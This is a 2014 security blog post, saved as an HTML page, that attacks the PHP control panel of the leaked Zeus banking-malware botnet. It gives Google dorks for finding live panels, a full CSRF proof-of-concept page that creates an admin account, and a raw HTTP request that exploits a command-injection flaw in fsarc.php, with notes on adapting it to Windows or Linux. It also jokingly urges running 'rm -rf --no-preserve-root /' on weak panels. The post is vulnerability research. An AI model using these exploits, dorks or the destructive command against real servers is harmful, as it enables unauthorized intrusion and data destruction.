<!DOCTYPE html>
<html class="direction--ltr"lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Attacking financial malware botnet panels - Zeus | Jump ESP, jump!</title>
<meta name="generator" content="Jekyll v4.0.1" />
<meta property="og:title" content="Attacking financial malware botnet panels - Zeus" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="I played with leaked financial malware recently. When I saw these panels are written in PHP, my first idea was to hack them. The results are the work of one evening, please don&#39;t expect a full pentest report with all vulns found :-) The following report is based on Zeus 2.0.8.9, which is old, but I believe a lot of Zeus clones (and C&amp;C panels) depend on this code. First things first, here are some Google dorks to find Zeus C&amp;C server panel related stuff: inurl:cp.php?m=login - this should be the login to the control panelinurl:_reports/files  - in these folders you can find the stolen stuff, pretty funny if it gets indexed by Googleinurl:install/index.php - this should be deleted, but I think this is useless now. Boring vulns found Clear text HTTP login - you can sniff the login password via MiTM, or steal the session cookiesNo password policy - admins can set up really weak passwordsNo anti brute-force - you can try to guess the admin&#39;s password. Default username is adminPassword autocomplete enabled - boringMissing HttpOnly flag on session cookie - it could be nice if I could find any XSS. I need more time to find one!No CSRF protection - except on the password change, where the old password is needed :-( boring Update: You can use the CSRF to create a new user with admin privileges: &lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;pre&gt; This is a CSRF POC to create a new admin user in Zeus admin panels. Username: user_1392719246 Password: admin1 You might change the URL from 127.0.0.1. Redirecting in a hidden iframe in &lt;span id=&quot;countdown&quot;&gt;10&lt;/span&gt; seconds. &lt;/pre&gt; &lt;iframe id=&quot;csrf-frame&quot; name=&quot;csrf-frame&quot; style=&quot;display: none;&quot;&gt;&lt;/iframe&gt; &lt;form action=&quot;http://127.0.0.1/cp.php?m=sys_users&amp;amp;new&quot; id=&quot;csrf-form&quot; method=&quot;post&quot; name=&quot;csrf-form&quot; target=&quot;csrf-frame&quot;&gt; &lt;input name=&quot;name&quot; type=&quot;hidden&quot; value=&quot;user_1392719246&quot; /&gt; &lt;input name=&quot;password&quot; type=&quot;hidden&quot; value=&quot;admin1&quot; /&gt; &lt;input name=&quot;status&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;comment&quot; type=&quot;hidden&quot; value=&quot;PWND!&quot; /&gt; &lt;input name=&quot;r_botnet_bots&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_botnet_scripts&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_botnet_scripts_edit&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_edit_bots&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_reports_db&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_reports_db_edit&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_reports_files&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_reports_files_edit&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_reports_jn&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_stats_main&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_stats_main_reset&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_stats_os&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_system_info&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_system_options&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_system_user&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_system_users&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;/form&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload=function(){ var counter = 10; var interval = setInterval(function() { counter--; document.getElementById(&#39;countdown&#39;).innerHTML = counter; if (counter == 0) { redirect(); clearInterval(interval); } }, 1000); }; function redirect() { document.getElementById(&quot;csrf-form&quot;).submit(); } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; MD5 password - the passwords stored in MySQL are MD5 passwords. No PBKDF2, bcrypt, scrypt, salt, whatever. MD5.ClickJacking - really boring stuffRemember me (MD5 cookies) - a very bad idea. In this case, the remember me function is implemented in a way where the MD5 of the password and MD5 of the username is stored in a cookie. If I have XSS, I could get the MD5(password) as well.SQLi - although concatenation is used instead of parameterized queries, and addslashes are used, the integers are always quoted. This means it can be hacked only in case of special encoding like GB/Big5, pretty unlikely. Whats good news (for the C&amp;C panel owners) The following stuff looks good, at least some vulns were taken seriously: The system directory is protected with .htaccess deny from all.gate.php - this is the &quot;gate&quot; between the bots and the server, this PHP is always exposed to the Internet. The execution of this PHP dies early if you don&#39;t know the key. But you can get the key from the binary of this specific botnet (another URL how to do this). If you have the key, then you can fill the database with garbage, but that&#39;s all I can think of now.Anti XSS: the following code is used almost everywherereturn htmlspecialchars(preg_replace(&#39;|[\x00-\x09\x0B\x0C\x0E-\x1F\x7F-\x9F]|u&#39;, &#39; &#39;, $string), ENT_QUOTES, &#39;UTF-8&#39;);My evil thought was to inject malicious bot_id, but it looks like it has been filtered everywhere. Sad panda. What&#39;s really bad news (for the C&amp;C panel owners) And the best vuln I was able to find, remote code execution through command injection (happy panda), but only for authenticated users (sad panda)." />
<meta property="og:description" content="I played with leaked financial malware recently. When I saw these panels are written in PHP, my first idea was to hack them. The results are the work of one evening, please don&#39;t expect a full pentest report with all vulns found :-) The following report is based on Zeus 2.0.8.9, which is old, but I believe a lot of Zeus clones (and C&amp;C panels) depend on this code. First things first, here are some Google dorks to find Zeus C&amp;C server panel related stuff: inurl:cp.php?m=login - this should be the login to the control panelinurl:_reports/files  - in these folders you can find the stolen stuff, pretty funny if it gets indexed by Googleinurl:install/index.php - this should be deleted, but I think this is useless now. Boring vulns found Clear text HTTP login - you can sniff the login password via MiTM, or steal the session cookiesNo password policy - admins can set up really weak passwordsNo anti brute-force - you can try to guess the admin&#39;s password. Default username is adminPassword autocomplete enabled - boringMissing HttpOnly flag on session cookie - it could be nice if I could find any XSS. I need more time to find one!No CSRF protection - except on the password change, where the old password is needed :-( boring Update: You can use the CSRF to create a new user with admin privileges: &lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;pre&gt; This is a CSRF POC to create a new admin user in Zeus admin panels. Username: user_1392719246 Password: admin1 You might change the URL from 127.0.0.1. Redirecting in a hidden iframe in &lt;span id=&quot;countdown&quot;&gt;10&lt;/span&gt; seconds. &lt;/pre&gt; &lt;iframe id=&quot;csrf-frame&quot; name=&quot;csrf-frame&quot; style=&quot;display: none;&quot;&gt;&lt;/iframe&gt; &lt;form action=&quot;http://127.0.0.1/cp.php?m=sys_users&amp;amp;new&quot; id=&quot;csrf-form&quot; method=&quot;post&quot; name=&quot;csrf-form&quot; target=&quot;csrf-frame&quot;&gt; &lt;input name=&quot;name&quot; type=&quot;hidden&quot; value=&quot;user_1392719246&quot; /&gt; &lt;input name=&quot;password&quot; type=&quot;hidden&quot; value=&quot;admin1&quot; /&gt; &lt;input name=&quot;status&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;comment&quot; type=&quot;hidden&quot; value=&quot;PWND!&quot; /&gt; &lt;input name=&quot;r_botnet_bots&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_botnet_scripts&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_botnet_scripts_edit&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_edit_bots&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_reports_db&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_reports_db_edit&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_reports_files&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_reports_files_edit&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_reports_jn&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_stats_main&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_stats_main_reset&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_stats_os&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_system_info&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_system_options&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_system_user&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_system_users&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;/form&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload=function(){ var counter = 10; var interval = setInterval(function() { counter--; document.getElementById(&#39;countdown&#39;).innerHTML = counter; if (counter == 0) { redirect(); clearInterval(interval); } }, 1000); }; function redirect() { document.getElementById(&quot;csrf-form&quot;).submit(); } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; MD5 password - the passwords stored in MySQL are MD5 passwords. No PBKDF2, bcrypt, scrypt, salt, whatever. MD5.ClickJacking - really boring stuffRemember me (MD5 cookies) - a very bad idea. In this case, the remember me function is implemented in a way where the MD5 of the password and MD5 of the username is stored in a cookie. If I have XSS, I could get the MD5(password) as well.SQLi - although concatenation is used instead of parameterized queries, and addslashes are used, the integers are always quoted. This means it can be hacked only in case of special encoding like GB/Big5, pretty unlikely. Whats good news (for the C&amp;C panel owners) The following stuff looks good, at least some vulns were taken seriously: The system directory is protected with .htaccess deny from all.gate.php - this is the &quot;gate&quot; between the bots and the server, this PHP is always exposed to the Internet. The execution of this PHP dies early if you don&#39;t know the key. But you can get the key from the binary of this specific botnet (another URL how to do this). If you have the key, then you can fill the database with garbage, but that&#39;s all I can think of now.Anti XSS: the following code is used almost everywherereturn htmlspecialchars(preg_replace(&#39;|[\x00-\x09\x0B\x0C\x0E-\x1F\x7F-\x9F]|u&#39;, &#39; &#39;, $string), ENT_QUOTES, &#39;UTF-8&#39;);My evil thought was to inject malicious bot_id, but it looks like it has been filtered everywhere. Sad panda. What&#39;s really bad news (for the C&amp;C panel owners) And the best vuln I was able to find, remote code execution through command injection (happy panda), but only for authenticated users (sad panda)." />
<link rel="canonical" href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/botnet/remote/code/execution/zeus/2014/02/14/Attacking-financial-malware-botnet-panels-Zeus.html" />
<meta property="og:url" content="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/botnet/remote/code/execution/zeus/2014/02/14/Attacking-financial-malware-botnet-panels-Zeus.html" />
<meta property="og:site_name" content="Jump ESP, jump!" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2014-02-14T14:00:32+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Attacking financial malware botnet panels - Zeus" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2014-02-14T14:00:32+00:00","datePublished":"2014-02-14T14:00:32+00:00","description":"I played with leaked financial malware recently. When I saw these panels are written in PHP, my first idea was to hack them. The results are the work of one evening, please don&#39;t expect a full pentest report with all vulns found :-) The following report is based on Zeus 2.0.8.9, which is old, but I believe a lot of Zeus clones (and C&amp;C panels) depend on this code. First things first, here are some Google dorks to find Zeus C&amp;C server panel related stuff: inurl:cp.php?m=login - this should be the login to the control panelinurl:_reports/files  - in these folders you can find the stolen stuff, pretty funny if it gets indexed by Googleinurl:install/index.php - this should be deleted, but I think this is useless now. Boring vulns found Clear text HTTP login - you can sniff the login password via MiTM, or steal the session cookiesNo password policy - admins can set up really weak passwordsNo anti brute-force - you can try to guess the admin&#39;s password. Default username is adminPassword autocomplete enabled - boringMissing HttpOnly flag on session cookie - it could be nice if I could find any XSS. I need more time to find one!No CSRF protection - except on the password change, where the old password is needed :-( boring Update: You can use the CSRF to create a new user with admin privileges: &lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;pre&gt; This is a CSRF POC to create a new admin user in Zeus admin panels. Username: user_1392719246 Password: admin1 You might change the URL from 127.0.0.1. Redirecting in a hidden iframe in &lt;span id=&quot;countdown&quot;&gt;10&lt;/span&gt; seconds. &lt;/pre&gt; &lt;iframe id=&quot;csrf-frame&quot; name=&quot;csrf-frame&quot; style=&quot;display: none;&quot;&gt;&lt;/iframe&gt; &lt;form action=&quot;http://127.0.0.1/cp.php?m=sys_users&amp;amp;new&quot; id=&quot;csrf-form&quot; method=&quot;post&quot; name=&quot;csrf-form&quot; target=&quot;csrf-frame&quot;&gt; &lt;input name=&quot;name&quot; type=&quot;hidden&quot; value=&quot;user_1392719246&quot; /&gt; &lt;input name=&quot;password&quot; type=&quot;hidden&quot; value=&quot;admin1&quot; /&gt; &lt;input name=&quot;status&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;comment&quot; type=&quot;hidden&quot; value=&quot;PWND!&quot; /&gt; &lt;input name=&quot;r_botnet_bots&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_botnet_scripts&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_botnet_scripts_edit&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_edit_bots&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_reports_db&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_reports_db_edit&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_reports_files&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_reports_files_edit&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_reports_jn&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_stats_main&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_stats_main_reset&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_stats_os&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_system_info&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_system_options&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_system_user&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;input name=&quot;r_system_users&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt; &lt;/form&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload=function(){ var counter = 10; var interval = setInterval(function() { counter--; document.getElementById(&#39;countdown&#39;).innerHTML = counter; if (counter == 0) { redirect(); clearInterval(interval); } }, 1000); }; function redirect() { document.getElementById(&quot;csrf-form&quot;).submit(); } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; MD5 password - the passwords stored in MySQL are MD5 passwords. No PBKDF2, bcrypt, scrypt, salt, whatever. MD5.ClickJacking - really boring stuffRemember me (MD5 cookies) - a very bad idea. In this case, the remember me function is implemented in a way where the MD5 of the password and MD5 of the username is stored in a cookie. If I have XSS, I could get the MD5(password) as well.SQLi - although concatenation is used instead of parameterized queries, and addslashes are used, the integers are always quoted. This means it can be hacked only in case of special encoding like GB/Big5, pretty unlikely. Whats good news (for the C&amp;C panel owners) The following stuff looks good, at least some vulns were taken seriously: The system directory is protected with .htaccess deny from all.gate.php - this is the &quot;gate&quot; between the bots and the server, this PHP is always exposed to the Internet. The execution of this PHP dies early if you don&#39;t know the key. But you can get the key from the binary of this specific botnet (another URL how to do this). If you have the key, then you can fill the database with garbage, but that&#39;s all I can think of now.Anti XSS: the following code is used almost everywherereturn htmlspecialchars(preg_replace(&#39;|[\\x00-\\x09\\x0B\\x0C\\x0E-\\x1F\\x7F-\\x9F]|u&#39;, &#39; &#39;, $string), ENT_QUOTES, &#39;UTF-8&#39;);My evil thought was to inject malicious bot_id, but it looks like it has been filtered everywhere. Sad panda. What&#39;s really bad news (for the C&amp;C panel owners) And the best vuln I was able to find, remote code execution through command injection (happy panda), but only for authenticated users (sad panda).","headline":"Attacking financial malware botnet panels - Zeus","mainEntityOfPage":{"@type":"WebPage","@id":"https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/botnet/remote/code/execution/zeus/2014/02/14/Attacking-financial-malware-botnet-panels-Zeus.html"},"url":"https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/botnet/remote/code/execution/zeus/2014/02/14/Attacking-financial-malware-botnet-panels-Zeus.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" />
  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/feed.xml" title="Jump ESP, jump!" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
  <script src="/assets/js/jquery.magnific-popup.js"></script>
</head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">Jump ESP, jump!<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">


<img src="
    https://gravatar.com/avatar/d41d8cd98f00b204e9800998ecf8427e?s=256
" class="author-avatar" alt="Avatar" />
<div class="description">Because Google started to delete hacking related blog posts  without using a single brain cell, I had to learn just another framework. Thx Google </div>

</div>


<div class="post">
  <h1 class="post-title">Attacking financial malware botnet panels - Zeus</h1>
  
  <div class="post-tags">
      
  </div>
  
  <div class="post-date">
    Published on 14 Feb 2014
    
  </div>
  
  <div style="">I played with leaked financial malware recently. When I saw these panels are written in PHP, my first idea was to hack them. The results are the work of one evening, please don't expect a full pentest report with all vulns found :-)</div>
<div style="">
</div>
<div style="">The following report is based on Zeus 2.0.8.9, which is old, but I believe a lot of Zeus clones (and C&amp;C panels) depend on this code.</div>
<div style="">
</div>
<div style="">First things first, here are some Google dorks to find Zeus C&amp;C server panel related stuff:</div>
<div style=""></div>
<ul><li>inurl:cp.php?m=login - this should be the login to the control panel</li><li>inurl:_reports/files  - in these folders you can find the stolen stuff, pretty funny if it gets indexed by Google</li><li>inurl:install/index.php - this should be deleted, but I think this is useless now.</li></ul>
<div class="separator" style=""><a href="https://z6543.github.io/_img/Zeus1.png" src="https://z6543.github.io/_img/Zeus1.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="" src="https://z6543.github.io/_img/Zeus1.png" width="400" /></a></div>
<h3>Boring vulns found</h3>
<ul><li style="text-align: justify;"><a href="https://www.owasp.org/index.php/Testing_for_Credentials_Transported_over_an_Encrypted_Channel_(OWASP-AT-001)">Clear text HTTP login</a> - you can sniff the login password via MiTM, or steal the session cookies</li><li style="text-align: justify;"><a href="https://www.owasp.org/index.php/Testing_for_Weak_password_policy_(OWASP-AT-008)">No password policy</a> - admins can set up really weak passwords</li><li style="text-align: justify;"><a href="https://www.owasp.org/index.php/Testing_for_Weak_lock_out_mechanism_(OWASP-AT-004)">No anti brute-force</a> - you can try to guess the admin's password. Default username is admin</li><li style="text-align: justify;"><a href="https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OWASP-AT-006)">Password autocomplete enabled</a> - boring</li><li style="text-align: justify;"><a href="https://www.owasp.org/index.php/Testing_for_cookies_attributes_(OWASP-SM-002)">Missing HttpOnly flag on session cookie</a> - it could be nice if I could find any XSS. I need more time to find one!</li><li style="text-align: justify;"><a href="https://www.owasp.org/index.php/Testing_for_CSRF_(OWASP-SM-005)">No CSRF protection</a> - except on the password change, where the old password is needed :-( boring</li></ul>
<p>Update: You can use the CSRF to create a new user with admin privileges:</p>
<div><div><pre class="prettyprint linenums lang-html">&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;pre&gt;
  This is a CSRF POC to create a new admin user in Zeus admin panels.
  Username: user_1392719246 Password: admin1
  You might change the URL from 127.0.0.1.
  Redirecting in a hidden iframe in &lt;span id="countdown"&gt;10&lt;/span&gt; seconds.  
&lt;/pre&gt;
&lt;iframe id="csrf-frame" name="csrf-frame" style="display: none;"&gt;&lt;/iframe&gt;
    &lt;form action="http://127.0.0.1/cp.php?m=sys_users&amp;amp;new" id="csrf-form" method="post" name="csrf-form" target="csrf-frame"&gt;
 &lt;input name="name" type="hidden" value="user_1392719246" /&gt; 
 &lt;input name="password" type="hidden" value="admin1" /&gt; 
 &lt;input name="status" type="hidden" value="1" /&gt; 
 &lt;input name="comment" type="hidden" value="PWND!" /&gt;
 &lt;input name="r_botnet_bots" type="hidden" value="1" /&gt; 
 &lt;input name="r_botnet_scripts" type="hidden" value="1" /&gt; 
 &lt;input name="r_botnet_scripts_edit" type="hidden" value="1" /&gt; 
 &lt;input name="r_edit_bots" type="hidden" value="1" /&gt; 
 &lt;input name="r_reports_db" type="hidden" value="1" /&gt; 
 &lt;input name="r_reports_db_edit" type="hidden" value="1" /&gt; 
 &lt;input name="r_reports_files" type="hidden" value="1" /&gt;
 &lt;input name="r_reports_files_edit" type="hidden" value="1" /&gt;
 &lt;input name="r_reports_jn" type="hidden" value="1" /&gt; 
 &lt;input name="r_stats_main" type="hidden" value="1" /&gt; 
 &lt;input name="r_stats_main_reset" type="hidden" value="1" /&gt; 
 &lt;input name="r_stats_os" type="hidden" value="1" /&gt; 
 &lt;input name="r_system_info" type="hidden" value="1" /&gt; 
 &lt;input name="r_system_options" type="hidden" value="1" /&gt;
 &lt;input name="r_system_user" type="hidden" value="1" /&gt; 
 &lt;input name="r_system_users" type="hidden" value="1" /&gt;
    &lt;/form&gt;
&lt;script type="text/javascript"&gt;
 window.onload=function(){ 
  var counter = 10;
  var interval = setInterval(function() {
   counter--;
   document.getElementById('countdown').innerHTML = counter;
   if (counter == 0) {
    redirect();
    clearInterval(interval);
   }
  }, 1000);
 };
    function redirect() {
  document.getElementById("csrf-form").submit();
    }
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre><ul><li style="text-align: justify;">MD5 password - the passwords stored in MySQL are MD5 passwords. No <a href="http://www.unlimitednovelty.com/2012/03/dont-use-bcrypt.html">PBKDF2, bcrypt, scrypt, salt</a>, whatever. MD5.</li><li style="text-align: justify;"><a href="http://www.contextis.com/research/tools/clickjacking-tool/">ClickJacking</a> - really boring stuff</li><li style="text-align: justify;">Remember me (MD5 cookies) - a very bad idea. In this case, the remember me function is implemented in a way where the MD5 of the password and MD5 of the username is stored in a cookie. If I have XSS, I could get the MD5(password) as well.</li><li style="text-align: justify;"><a href="https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OWASP-DV-005)">SQLi</a> - although concatenation is used instead of parameterized queries, and addslashes are used, the integers are always quoted. This means it can be hacked only in case of special encoding like GB/Big5, pretty unlikely.</li></ul>
<h3>Whats good news (for the C&amp;C panel owners)</h3>
The following stuff looks good, at least some vulns were taken seriously:
<ul><li>The system directory is protected with .htaccess deny from all.</li><li>gate.php - this is the "gate" between the bots and the server, this PHP is always exposed to the Internet. The execution of this PHP dies early if you don't know the key. But you can <a href="http://blog.threatexpert.com/2009/09/time-to-revisit-zeus-almighty.html">get the key</a> from the binary of this specific botnet (<a href="http://mnin.blogspot.be/2011/09/abstract-memory-analysis-zeus.html">another URL how to do this</a>). If you have the key, then you can fill the database with garbage, but that's all I can think of now.</li><li>Anti <a href="https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OWASP-DV-001)">XSS</a>: the following code is used almost everywhere</li><pre class="prettyprint lang-js">return htmlspecialchars(preg_replace('|[\x00-\x09\x0B\x0C\x0E-\x1F\x7F-\x9F]|u', ' ', $string), ENT_QUOTES, 'UTF-8');</pre>My evil thought was to inject malicious bot_id, but it looks like it has been filtered everywhere. Sad panda.</ul>
<h3>What's really bad news (for the C&amp;C panel owners)</h3>
And the best vuln I was able to find, <a href="https://www.owasp.org/index.php/Testing_for_Command_Injection_(OWASP-DV-013)">remote code execution</a> through command injection (happy panda), but only for authenticated users (sad panda).

The vulnerable code is in system/fsarc.php:

<div class="separator" style=""><a href="https://z6543.github.io/_img/Zeus2.png" src="https://z6543.github.io/_img/Zeus2.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="" src="https://z6543.github.io/_img/Zeus2.png" width="400" /></a></div><pre class="prettyprint lang-php">function fsarcCreate($archive, $files){
   ...
   $archive .= '.zip';
   $cli = 'zip -r -9 -q -S "'.$archive.'" "'.implode('" "', $files).'"';
   exec($cli, $e, $r);
}</pre>
The exploit could not be simpler: 
<pre class="prettyprint lang-html">POST /cp.php?m=reports_files&amp;path= HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

filesaction=1&amp;files%5B%5D=files"||ping%20-n%2010%20127.0.0.1
</pre>because the zip utility was not found on my Windows box. You can try to replace || with &amp;&amp; when attacking Windows (don't forget to URL encode it!), or replace || with ; when attacking Linux. You can also link this vulnerability with the CSRF one, but it is unlikely you know both the control panel admin, and the control panel URLs. Or if this is the case, the admin should practice better OPSEC :)
Recommendation: use <a href="http://www.php.net/manual/en/function.escapeshellcmd.php">escapeshellcmd</a> next time.

Next time you find a vulnerable control panel with a weak password, just rm -rf --no-preserve-root / it ;-)

That's all folks!
Special greetz to Richard (XAMPP Apache service is running as SYSTEM ;-) )

<b>Update:</b> Looks like the gate.php is worth to investigate if you know the RC4 key. <a href="http://cybercrime-tracker.net/zeus.php">You can upload a PHP shell :)</a></div></div>

</div>





<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2024/03/01/VPN-Snakeoil.html">
            Personal VPN services are snake-oil
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2023/04/05/Just_use_Jekyll.html">
            "Just" migrate to Jekyll ...
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2022/09/16/Google.html">
            So Long Google, and Thanks for All the Fish
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  




<script>
  let i = 0;
  const text = '';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();

  // Image modal
  var $imgs = [];
  $('img').each(function(idx) {
    var obj = {
      src: $(this).attr('src')
    }
    $imgs.push(obj);
    var elem = $(this);
    $(this).click(function() {
      $('.modal').magnificPopup('open', idx);
    });
  });

  $('.modal').magnificPopup({
    items: $imgs,
    type: 'image',
    closeOnContentClick: true,
    mainClass: 'mfp-img-mobile',
    image: {
      verticalFit: true
    }
    
  });
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
